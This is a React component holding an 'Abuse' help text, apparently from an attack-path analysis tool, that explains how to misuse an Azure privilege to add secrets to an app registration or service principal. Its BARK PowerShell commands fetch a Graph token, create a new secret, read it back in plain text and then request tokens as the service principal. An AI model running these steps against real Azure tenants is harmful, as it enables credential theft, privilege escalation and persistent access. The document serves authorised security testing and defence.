import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                There are several ways to perform this abuse, depending on what
                sort of access you have to the credentials of the object that
                holds this privilege against the target object. If you have an
                interactive web browser session for the Azure portal, it is as
                simple as finding the target App in the portal and adding a new
                secret to the object using the “Certificates & secrets” tab.
                Service Principals do not have this tab in the Azure portal but
                you can add secrets to them with the MS Graph API.
            </p>

            <p>
                No matter what kind of control you have, you will be able to
                perform this abuse by using BARK’s New-AppRegSecret or
                New-ServicePrincipalSecret functions.
            </p>

            <p>
                These functions require you to supply an MS Graph-scoped JWT 
                associated with the Service Principal that has the privilege 
                to add secrets to the target object. There are several ways to
                acquire a JWT. For example, you may use BARK’s
                Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT
                by supplying a Service Principal Client ID and secret:
            </p>

                <pre>
                    <code>
                        {
                            '$MGToken = Get-MSGraphTokenWithClientCredentials `\n' +
                            '    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n' +
                            '    -ClientSecret "asdf..." `\n' +
                            '    -TenantName "contoso.onmicrosoft.com"'
                        }
                    </code>
                </pre>

            <p>
                Then use BARK’s New-AppRegSecret to add a new secret to the
                target application:
            </p>

                <pre>
                    <code>
                        {
                            'New-AppRegSecret `\n' +
                            '    -AppRegObjectID "d878…" `\n' +
                            '    -Token $MGToken.access_token'
                        }
                    </code>
                </pre>

            <p>
                The output will contain the plain-text secret you just created
                for the target app:
            </p>

                <pre>
                    <code>
                        {
                            'New-AppRegSecret `\n' +
                            '    -AppRegObjectID "d878…" `\n' +
                            '    -Token $MGToken.access_token\n' +
                            '\n' +
                            'Name                Value\n' +
                            '-----------------------------\n' +
                            'AppRegSecretValue   odg8Q~...\n' +
                            'AppRegAppId         4d31…\n' +
                            'AppRegObjectId      d878…'
                        }
                    </code>
                </pre>

            <p>
                With this plain text secret, you can now acquire tokens as the
                service principal associated with the app. You can easily do
                this with BARK’s Get-MSGraphToken function:
            </p>

                <pre>
                    <code>
                        {
                            '$SPToken = Get-MSGraphToken `\n' +
                            '    -ClientID "4d31…" `\n' +
                            '    -ClientSecret "odg8Q~..." `\n' +
                            '    -TenantName "contoso.onmicrosoft.com"'
                        }
                    </code>
                </pre>

            <p>
                Now you can use this JWT to perform actions against any other MS
                Graph endpoint as the service principal, continuing your attack
                path with the privileges of that service principal.
            </p>
        </>
    );
};

export default Abuse;